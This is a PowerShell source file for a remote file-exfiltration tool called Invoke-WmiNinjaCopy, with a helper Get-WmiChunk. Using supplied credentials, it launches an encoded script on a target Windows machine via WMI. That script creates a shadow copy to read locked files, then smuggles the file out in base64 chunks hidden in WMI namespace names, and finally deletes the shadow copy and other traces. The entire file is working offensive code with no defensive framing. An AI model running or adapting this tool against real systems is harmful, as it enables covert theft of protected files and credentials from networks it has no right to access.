function Invoke-WmiNinjaCopy {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Position = 0, Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [String]
    $RemotePath,
    
    [Parameter(Position = 1)]
    [string]
    $LocalPath = "."

) # End Param

    #$LocalPath = Resolve-Path $LocalPath
    $RemoteScript = @"

`$NewShadowVolume = ([WMICLASS]"root\cimv2:Win32_ShadowCopy").Create("$RemotePath".SubString(0,3), "ClientAccessible")
`$ShadowDevice = (Get-WmiObject -Query "SELECT * FROM WIn32_ShadowCopy WHERE ID='`$(`$NewShadowVolume.ShadowID)'").DeviceObject + '\'
Invoke-Command {cmd.exe /c mklink /d %TEMP%\Shadow `$ShadowDevice}

function Insert-Piece(`$i, `$piece) {
    `$Count = `$i.ToString()
	`$Zeros = "0" * (6 - `$Count.Length)
	`$Tag = "$Tag" + `$Zeros + `$Count
	`$Piece = `$Tag + `$piece + `$Tag
	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
}
function Insert-EncodedChunk (`$ByteBuffer) {
    `$EncodedChunk = [Convert]::ToBase64String(`$ByteBuffer)
    `$WmiEncoded = `$EncodedChunk -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    `$nop = [Math]::Floor(`$WmiEncoded.Length / 5500)
    if (`$WmiEncoded.Length -gt 5500) {
        `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
        `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
        for(`$i = 1; `$i -le `$nop; `$i++) { 
	        `$piece = `$WmiEncoded.Substring(0,5500)
		    `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
		    Insert-Piece `$i `$piece
        }
        `$WmiEncoded = `$LastPiece
    }
    Insert-Piece (`$nop + 1) `$WmiEncoded
    Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='CHUNK_READY'}
}
[UInt64]`$FileOffset = 0
`$BufferSize = $BufferSize
`$Path = `$env:TEMP + "\Shadow" + "$RemotePath".SubString(2, "$RemotePath".Length - 2)
`$FileStream = New-Object System.IO.FileStream "`$Path",([System.IO.FileMode]::Open)
`$BytesLeft = `$FileStream.Length
if (`$FileStream.Length -gt `$BufferSize) {
    [Byte[]]`$ByteBuffer = New-Object Byte[] `$BufferSize
    do {
        `$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
        `$FileStream.Read(`$ByteBuffer, 0, `$BufferSize) | Out-Null
        [UInt64]`$FileOffset += `$ByteBuffer.Length
        `$BytesLeft -= `$ByteBuffer.Length
        Insert-EncodedChunk `$ByteBuffer
        `$ChunkDownloaded = ""
        do {`$ChunkDownloaded = Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like 'CHUNK_DOWNLOADED'"
        } until (`$ChunkDownloaded)
        Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
    } while (`$BytesLeft -gt `$BufferSize)
}
`$ByteBuffer = `$null
[Byte[]]`$ByteBuffer = New-Object Byte[] (`$BytesLeft)
`$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin)
`$FileStream.Read(`$ByteBuffer, 0, `$BytesLeft)
Insert-EncodedChunk `$ByteBuffer
`$FileStream.Flush()
`$FileStream.Dispose()
`$FileStream = `$null
`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='DOWNLOAD_COMPLETE'}

Invoke-Command {cmd.exe /c rmdir %TEMP%\Shadow}

Get-WmiObject -Query "SELECT * FROM Win32_ShadowCopy WHERE ID='`$(`$NewShadowVolume.ShadowID)'" | Remove-WmiObject

"@
    $ScriptBlock = [ScriptBlock]::Create($RemoteScript)
    $EncodedPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock
    $null = Invoke-WmiMethod -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh

    $DownloadComplete = ""
    do {
        Get-WmiChunk -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Path $LocalPath
        $DownloadComplete = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'DOWNLOAD_COMPLETE'"
    } until ($DownloadComplete)
    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_COMPLETE' or Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
}
function Get-WmiChunk {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Mandatory = $True)]
    [string]$Path

) # End Param
    
    $Reconstructed = New-Object System.Text.StringBuilder

    $ChunkReady = ""
    do {$ChunkReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'"
    } until ($ChunkReady)

    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'" | Remove-WmiObject
    
    $GetB64Strings = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
    
    foreach ($line in $GetB64Strings) {
	    $WmiToBase64 = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
        $WmiToBase64 = $WmiToBase64.Remove($WmiToBase64.Length - 14, 14)
	    $null = $Reconstructed.Append($WmiToBase64)
    }
        
    if ($Reconstructed.ToString().Length % 4 -ne 0) { $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) }

    [Byte[]]$DecodedByteArray = [Convert]::FromBase64String($Reconstructed)

    $FileStream = New-Object System.IO.FileStream $Path,([System.IO.FileMode]::Append)
    $null = $FileStream.Seek(0, [System.IO.SeekOrigin]::End)
    $FileStream.Write($DecodedByteArray, 0, $DecodedByteArray.Length)
    $FileStream.Flush()
    $FileStream.Dispose()
    $FileStream = $null    
    
    $null = Set-WmiInstance -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name="CHUNK_DOWNLOADED"}
}